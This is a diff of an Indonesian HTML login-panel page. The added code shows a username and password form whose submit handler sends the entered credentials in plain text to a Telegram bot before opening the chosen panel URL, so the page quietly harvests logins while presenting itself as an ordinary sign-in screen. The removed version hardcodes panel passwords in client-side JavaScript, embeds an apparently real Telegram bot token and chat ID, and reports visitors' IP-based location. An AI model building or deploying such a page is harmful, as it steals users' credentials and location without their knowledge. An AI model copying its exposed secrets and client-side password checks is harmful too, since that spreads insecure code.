@@ -1,449 +1,244 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Web Menu Panel Jasteb Faanzy</title>
+    <meta charset="UTF-8">
+    <title>Panel Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Font dan Icon -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/a2e0c1d6b1.js" crossorigin="anonymous"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-
-        /* Reset & base */
-        * {
-            box-sizing: border-box;
-        }
-
         body {
             margin: 0;
-            font-family: 'Poppins', Arial, sans-serif;
-            background: url('https://files.catbox.moe/5bpqir.jpg') no-repeat center center/cover;
-            height: 100vh;
+            padding: 0;
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            overflow: hidden;
+        }
+        .centered {
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-            color: #fff;
+            height: 100vh;
+            flex-direction: column;
         }
-
-        .menu-container {
-            background: rgba(0, 0, 0, 0.5);
+        .panel-box {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
             border-radius: 20px;
-            padding: 30px 40px;
-            max-width: 350px;
-            width: 100%;
-            box-shadow: 0 8px 32px 0 rgba(0, 255, 255, 0.4);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(0, 255, 255, 0.3);
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
             text-align: center;
-            display: none; /* hidden initially */
         }
-
-        #menu-title {
-            font-weight: 600;
-            font-size: 1.8rem;
-            margin-bottom: 25px;
-            letter-spacing: 2px;
-            text-shadow: 0 0 8px #00fff7;
+        h2, h3 {
+            margin-bottom: 20px;
+            color: cyan;
         }
-
-        #menu-buttons button {
-            background: linear-gradient(45deg, #00f0ff, #007bff);
+        input, button {
+            padding: 12px 18px;
+            margin: 8px 0;
             border: none;
-            border-radius: 12px;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+        }
+        input {
+            background: rgba(0, 0, 0, 0.4);
             color: white;
-            font-weight: 600;
-            font-size: 1rem;
-            padding: 14px 0;
             width: 100%;
-            max-width: 300px;
-            margin: 12px auto;
+        }
+        button {
+            background-color: cyan;
+            color: #000;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.6);
-            letter-spacing: 1px;
+            width: 100%;
+        }
+        .input-wrapper {
             position: relative;
-            overflow: hidden;
+            margin-bottom: 15px;
         }
-
-        #menu-buttons button::before {
-            content: '';
+        .input-wrapper i {
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at center, rgba(0, 255, 255, 0.3) 0%, transparent 70%);
-            transform: scale(0);
-            transition: transform 0.5s ease;
-            pointer-events: none;
-            border-radius: 12px;
+            right: 10px;
+            top: 12px;
+            color: cyan;
         }
-
-        #menu-buttons button:hover::before {
-            transform: scale(1);
-        }
-
-        #menu-buttons button:hover {
-            box-shadow: 0 0 25px rgba(0, 255, 255, 1);
-            transform: translateY(-3px);
-        }
-
-        /* Notification styles */
         .notification {
             position: fixed;
             top: 20px;
             right: 20px;
-            padding: 14px 24px;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: 600;
-            z-index: 100;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            animation: fadeOut 3s forwards;
-            box-shadow: 0 0 12px rgba(0, 255, 255, 0.7);
+            padding: 14px 20px;
+            background: rgba(0,0,0,0.8);
+            border-left: 5px solid;
+            z-index: 999;
+            animation: fade 0.3s ease-in-out;
+        }
+        .notification.success { border-color: cyan; }
+        .notification.error { border-color: red; }
+
+        @keyframes fade {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .notification.success {
-            background-color: #0f4124;
-            color: #00ffab;
-            border: 1px solid #00ffab;
-        }
-
-        .notification.error {
-            background-color: #3e1010;
-            color: #ff4f4f;
-            border: 1px solid #ff4f4f;
-        }
-
-        .icon {
-            width: 24px;
-            height: 24px;
-            display: inline-block;
-            border-radius: 50%;
-            position: relative;
-            flex-shrink: 0;
-        }
-
-        .icon.success {
-            background-color: #00ffab;
-        }
-
-        .icon.success::after {
-            content: '';
-            position: absolute;
-            width: 8px;
-            height: 16px;
-            border: solid #003300;
-            border-width: 0 3px 3px 0;
-            transform: rotate(45deg);
-            top: 3px;
-            left: 8px;
-            animation: checkmark 0.5s ease-in-out;
-        }
-
-        .icon.error {
-            background-color: #ff4f4f;
-        }
-
-        .icon.error::before,
-        .icon.error::after {
-            content: '';
-            position: absolute;
-            width: 16px;
-            height: 3px;
-            background: #330000;
-            top: 10px;
-            left: 4px;
-            transform-origin: center;
-            animation: cross 0.5s ease-in-out;
-        }
-
-        .icon.error::before {
-            transform: rotate(45deg);
-        }
-
-        .icon.error::after {
-            transform: rotate(-45deg);
-        }
-
-        @keyframes fadeOut {
-            0% { opacity: 1; }
-            80% { opacity: 1; }
-            100% { opacity: 0; transform: translateY(-20px); }
-        }
-
-        @keyframes checkmark {
-            0% { transform: scale(0) rotate(45deg); }
-            50% { transform: scale(1.2) rotate(45deg); }
-            100% { transform: scale(1) rotate(45deg); }
-        }
-
-        @keyframes cross {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-
-        /* Modal styles */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75);
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.6);
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             z-index: 1000;
-            animation: fadeIn 0.3s ease forwards;
         }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
         .modal {
-            background: rgba(0, 0, 0, 0.35);
-            backdrop-filter: blur(16px);
-            border: 2px solid #00fff7;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(15px);
+            padding: 30px;
             border-radius: 20px;
-            padding: 30px 35px;
-            width: 90%;
-            max-width: 380px;
-            text-align: center;
-            color: #00fff7;
-            box-shadow: 0 0 25px #00fff7aa;
-            font-family: 'Poppins', Arial, sans-serif;
-            position: relative;
+            width: 300px;
         }
 
-        .modal h3 {
-            font-weight: 700;
-            font-size: 1.6rem;
-            margin-bottom: 25px;
-            letter-spacing: 1.2px;
-            text-shadow: 0 0 10px #00fff7;
-        }
-
-        .input-wrapper {
-            position: relative;
-            margin-bottom: 28px;
-        }
-
-        .input-wrapper input {
-            width: 100%;
-            padding: 14px 48px 14px 18px;
-            font-size: 1rem;
-            border-radius: 15px;
-            border: none;
-            background: rgba(0, 255, 255, 0.12);
-            color: #00fff7;
-            outline: none;
-            box-shadow: inset 0 0 10px #00fff7aa;
-            transition: background 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .input-wrapper input::placeholder {
-            color: #00fff7bb;
-        }
-
-        .input-wrapper input:focus {
-            background: rgba(0, 255, 255, 0.25);
-            box-shadow: 0 0 12px #00fff7ee;
-        }
-
-        .input-wrapper i {
-            position: absolute;
-            right: 18px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #00fff7cc;
-            font-size: 1.3rem;
-            pointer-events: none;
-            user-select: none;
-            text-shadow: 0 0 6px #00fff7bb;
-        }
-
-        .modal button {
-            width: 100%;
-            padding: 14px 0;
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #000;
-            background: linear-gradient(90deg, #00fff7, #007bff);
-            border: none;
-            border-radius: 18px;
-            cursor: pointer;
-            box-shadow: 0 0 25px #00fff7bb;
-            transition: all 0.3s ease;
-            letter-spacing: 1px;
-        }
-
-        .modal button:hover {
-            background: linear-gradient(90deg, #007bff, #00fff7);
-            box-shadow: 0 0 30px #00fff7ff;
-            transform: translateY(-2px);
-            color: #fff;
-        }
-
-        /* Scrollbar for menu container */
-        .menu-container::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .menu-container::-webkit-scrollbar-thumb {
-            background: #00fff7bb;
-            border-radius: 20px;
-        }
-
-        .menu-container::-webkit-scrollbar-track {
-            background: transparent;
+        #menu-buttons button {
+            margin-top: 10px;
+            width: 200px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Modal awal input nama -->
-    <div id="name-modal-container">
-        <div class="modal-overlay">
-            <div class="modal" onclick="event.stopPropagation()">
-                <h3>Masukkan Nama Anda</h3>
-                <div class="input-wrapper">
-                    <input type="text" id="nameInput" placeholder="Nama Anda" autofocus>
-                    <i class="fas fa-user"></i>
-                </div>
-                <button onclick="submitName()">Lanjut</button>
-            </div>
+<!-- Modal Input Nama -->
+<div id="name-modal-container" class="centered">
+    <div class="panel-box">
+        <h2>Selamat Datang</h2>
+        <div class="input-wrapper">
+            <input type="text" id="nameInput" placeholder="Masukkan Nama Anda">
+            <i class="fas fa-user"></i>
         </div>
+        <button onclick="submitName()">Masuk</button>
     </div>
+</div>
 
-    <div class="menu-container" id="menu-container">
-        <h2 id="menu-title">Pilih Panel Jasteb Anda</h2>
+<!-- Menu Panel -->
+<div id="menu-container" style="display:none;" class="centered">
+    <div class="panel-box">
+        <h3>Pilih Panel</h3>
         <div id="menu-buttons"></div>
     </div>
+</div>
 
-    <div id="modal-container" style="display:none;"></div>
+<!-- Modal Login -->
+<div id="modal-container" style="display:none;"></div>
 
-    <!-- FontAwesome untuk icon -->
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+<script>
+    let userName = "";
+    const telegramBotToken = "ISI_TOKEN_BOT"; // Ganti dengan token bot kamu
+    const telegramChatId = "ISI_CHAT_ID";     // Ganti dengan chat ID kamu
 
-    <script>
-        const telegramBotToken = '7837072590:AAFtIrE2PcCN4afhybGYCLKGqIHo0wKgL4U';
-        const telegramChatId = '7274253936';
-
-        let userName = ''; // simpan nama user
-
-        function sendTelegramNotification(message) {
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: message
-                })
-            });
+    function submitName() {
+        const input = document.getElementById('nameInput');
+        const name = input.value.trim();
+        if (!name) {
+            alert('Mohon masukkan nama terlebih dahulu!');
+            return;
         }
+        userName = name;
+        document.getElementById('name-modal-container').style.display = 'none';
+        document.getElementById('menu-container').style.display = 'flex';
 
-        async function getLocation() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return `${data.city}, ${data.region}, ${data.country_name}`;
-            } catch (error) {
-                console.error('Gagal mengambil lokasi:', error);
-                return 'Lokasi tidak diketahui';
-            }
-        }
-
-        const menuConfig = [
-            { text: "PRIBADIFAAN", url: "https://ramadhanmoon.nicohosting.my.id/Pribfaanzy/ultimate", password: "OCTA" },
-            { text: "PT JASTEB 1", url: "https://ramadhanmoon.nicohosting.my.id/ptfaanzy/ultimate", password: "111" },
-            { text: "ZaanHost", url: "https://ramadhanmoon.nicohosting.my.id/teamfaanzy/ultimate", password: "zan" },
-            { text: "PRIBADI FAAN", url: "https://ramadhanmoon.nicohosting.my.id/sewafaan2/ultimate", password: "faantek" },
-            { text: "kosong", url: "Yahaha", password: "yanto1" },
+        const panels = [
+            { name: 'Panel Admin', url: 'https://example.com/admin' },
+            { name: 'Panel User', url: 'https://example.com/user' },
+            { name: 'Panel Report', url: 'https://example.com/report' }
         ];
 
-        const menuButtonsContainer = document.getElementById('menu-buttons');
-        const menuContainer = document.getElementById('menu-container');
-        const nameModalContainer = document.getElementById('name-modal-container');
+        const menuButtons = document.getElementById('menu-buttons');
+        menuButtons.innerHTML = '';
+        panels.forEach(panel => {
+            const btn = document.createElement('button');
+            btn.textContent = panel.name;
+            btn.onclick = () => openLoginPanel(panel);
+            menuButtons.appendChild(btn);
+        });
+    }
 
-        function createMenuButtons() {
-            menuConfig.forEach((menu) => {
-                const button = document.createElement('button');
-                button.textContent = menu.text;
-                button.onclick = () => showPasswordModal(menu);
-                menuButtonsContainer.appendChild(button);
-            });
-        }
-
-        function showNotification(message, type) {
-            const notification = document.createElement('div');
-            notification.className = `notification ${type}`;
-            notification.innerHTML = `
-                <span class="icon ${type}"></span>
-                <span>${message}</span>
-            `;
-            document.body.appendChild(notification);
-            setTimeout(() => {
-                notification.remove();
-            }, 3000);
-        }
-
-        function showPasswordModal(menu) {
-            const modalContainer = document.getElementById("modal-container");
-            modalContainer.innerHTML = `
-                <div class="modal-overlay" onclick="closeModal(event)">
-                    <div class="modal" onclick="event.stopPropagation()">
-                        <h3>Masuk ke ${menu.text}</h3>
-                        <div class="input-wrapper">
-                            <input type="password" id="passwordInput" placeholder="Masukkan Password" autofocus>
-                            <i class="fas fa-lock"></i>
-                        </div>
-                        <button onclick="checkPassword('${menu.password}', '${menu.url}', '${menu.text}')">Masuk</button>
-                    </div>
+    function openLoginPanel(panel) {
+        const modalContainer = document.getElementById('modal-container');
+        modalContainer.style.display = 'block';
+        modalContainer.innerHTML = `
+        <div class="modal-overlay" onclick="closeLoginPanel()">
+            <div class="modal" onclick="event.stopPropagation()">
+                <h3>Login ${panel.name}</h3>
+                <div class="input-wrapper">
+                    <input type="text" id="login-username" placeholder="Username" autofocus>
+                    <i class="fas fa-user"></i>
                 </div>
-            `;
-            modalContainer.style.display = 'block';
+                <div class="input-wrapper">
+                    <input type="password" id="login-password" placeholder="Password">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <button onclick="submitLogin('${panel.url}')">Login</button>
+            </div>
+        </div>`;
+    }
 
-            // Focus input automatically
-            setTimeout(() => {
-                document.getElementById('passwordInput').focus();
-            }, 100);
+    function closeLoginPanel() {
+        const modalContainer = document.getElementById('modal-container');
+        modalContainer.style.display = 'none';
+        modalContainer.innerHTML = '';
+    }
+
+    function submitLogin(url) {
+        const username = document.getElementById('login-username').value.trim();
+        const password = document.getElementById('login-password').value.trim();
+
+        if (!username || !password) {
+            alert('Username dan password harus diisi!');
+            return;
         }
 
-        function closeModal(e) {
-            if (e.target.classList.contains('modal-overlay')) {
-                document.getElementById("modal-container").style.display = "none";
-            }
-        }
+        const message = `Login Panel\nNama: ${userName}\nUsername: ${username}\nPassword: ${password}\nLink: ${url}`;
+        sendTelegramNotification(message);
 
-        async function checkPassword(expectedPassword, redirectUrl, panelName) {
-            const userPassword = document.getElementById('passwordInput').value.trim();
+        closeLoginPanel();
+        window.open(url, '_blank');
+    }
 
-            if (!userPassword) {
-                showNotification("Password tidak boleh kosong.", 'error');
-                return;
-            }
-
-            if (userPassword === expectedPassword) {
-                showNotification("Password benar! Anda akan diarahkan ke panel.", 'success');
-                const lokasi = await getLocation();
-                const notifMessage = `✅ Login Berhasil!\nPanel: ${panelName}\nLokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}`;
-                sendTelegramNotification(notifMessage);
-                setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 1500);
+    function sendTelegramNotification(message) {
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                showNotification('Login berhasil dikirim ke Telegram!', 'success');
             } else {
-                showNotification("Password salah! Silakan coba lagi.", 'error');
+                showNotification('Gagal mengirim notifikasi ke Telegram.', 'error');
             }
+        })
+        .catch(() => showNotification('Terjadi kesalahan koneksi.', 'error'));
+    }
 
-            // Tutup modal setelah submit sedikit delay
-            setTimeout(() => {
-                document.getElementById("modal-container").style.display = "none";
-            }, 500);
-        }
-    </script>
+    function showNotification(message, type) {
+        const notif = document.createElement('div');
+        notif.className = `notification ${type}`;
+        notif.innerHTML = `<span>${message}</span>`;
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 3500);
+    }
+
+    document.getElementById('nameInput').addEventListener('keydown', e => {
+        if (e.key === 'Enter') submitName();
+    });
+</script>
+
 </body>
 </html>
